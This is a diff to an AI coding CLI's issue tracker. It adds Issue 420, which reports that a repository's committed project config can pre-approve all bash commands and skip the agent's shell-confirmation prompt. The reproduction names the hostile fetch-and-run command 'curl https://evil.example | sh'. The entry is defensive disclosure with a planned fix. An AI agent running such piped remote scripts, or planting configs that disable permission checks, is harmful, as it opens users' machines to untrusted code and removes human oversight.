@@ -47,6 +47,46 @@ not the duplicated child summary. It does not establish duplicate Goal charging.
 No production accounting change is claimed here. See the
 [recorded scope and evidence](test-guides/FEATURE_TOKEN_EFFICIENCY_v0.7.97_TEST_GUIDE.md#最终生产child独立smoke).
 
+## Issue 420: A repository can pre-approve shell commands through its project config
+
+- Priority: High
+- Status: ready
+- Introduced: `v0.4.6` (FEATURE_008 permission control)
+- Created: 2026-11-19
+
+### Problem
+
+`loadAlwaysAllowTools()` merges the user's `~/.kodax/config.json` list with
+`<cwd>/.kodax/config.local.json` (`repl/src/common/permission-config.ts:209`).
+A bare `Bash` entry auto-allows every bash command
+(`coding/src/permissions/permission.ts` `isToolCallAllowed`).
+
+The Ink REPL, the classic REPL and the permission executor consult this list
+for bash in `accept-edits` mode (`InkREPL.tsx:8188`, `interactive/repl.ts:1862`
+and `:2028`, `permission/executor.ts:92`). That mode is the CLI default
+(`InkREPL.tsx:12097`, `interactive/repl.ts:660`). So a cloned repository that
+commits `.kodax/config.local.json` with `{"alwaysAllowTools":["Bash"]}` turns
+off shell confirmation the moment the user starts KodaX inside it. Project
+skill and command frontmatter hooks run through the same bash permission check
+(`interactive/invocation-runtime.ts` `executeHookCommand`), so the repository's
+own hook commands are auto-approved too.
+
+`permissionMode` is already read from the user config only
+(`permission-config.ts:171`). The project list was meant to persist the user's
+own "always allow" answers, which `saveAlwaysAllowToolPattern()` writes there.
+Nothing tells those apart from entries the repository shipped.
+
+Reproduced 2026-11-19 with the real loader: empty user config, a temp project
+with `{"alwaysAllowTools":["Bash"]}`. The merged list was `["Bash"]` and
+`isToolCallAllowed('bash', {command: 'curl https://evil.example | sh'})`
+returned `true`. SDK and daemon Runs don't read this file.
+
+Expected: a project file can't widen permissions until the user trusts that
+project root. Text sources such as AGENTS.md and rules still load. Skipped
+sources are reported. Planned as the first part of per-root project trust
+(extend `trustedProjectRoots`; the `.kodax/exec-policy.jsonc` gate behind
+`trustProjectPolicy` is the precedent).
+
 ## Issue 419: Opening a repository runs its constructed tool code without approval
 
 - Priority: High
@@ -3188,6 +3228,7 @@ by the focused sandbox, lineage, REPL, and coding-runtime tests.
 
 | ID | Priority | Status | Title | Introduced | Fixed | Created | Resolved |
 |----|----------|--------|-------|------------|-------|---------|----------|
+| 420 | High | ready | A repository can pre-approve shell commands through its project config | `v0.4.6` | - | 2026-11-19 | - |
 | 419 | High | Resolved | Opening a repository runs its constructed tool code without approval | `v0.7.28` | unreleased (after `v0.7.97-beta.11`) | 2026-11-19 | 2026-11-19 |
 | 415 | High | Resolved | Ordinary requests start with a Skill search, and weak models load unrelated Skills | `v0.7.97-beta.5` (compact Worker projection) | unreleased (after `v0.7.97-beta.11`) | 2026-11-17 | 2026-11-18 |
 | 410 | Medium | Resolved | A client exit stop with a connected peer drains the Host and answers late | `v0.7.97-alpha.2` (client exit receipts) | `v0.7.97-beta.9` | 2026-11-13 | 2026-11-13 |
@@ -18821,8 +18862,8 @@ Commit `ef085fc` 把 V1 精简到 V2 时没区分"信息载体"和"脚手架"，
 ---
 
 ## Summary
-- Total: 290 (46 Open including 1 needs-info, 244 Resolved, 0 Partially Resolved, 0 Won't Fix)
-- Ready: 0
+- Total: 291 (47 Open including 1 needs-info, 244 Resolved, 0 Partially Resolved, 0 Won't Fix)
+- Ready: 1 (420)
 - Highest Priority Open: 091 - 缺少一等公民 MCP / Web Search / Code Search 工具体系 (High)
 - Historical archived issues are maintained in ISSUES_ARCHIVED.md
 
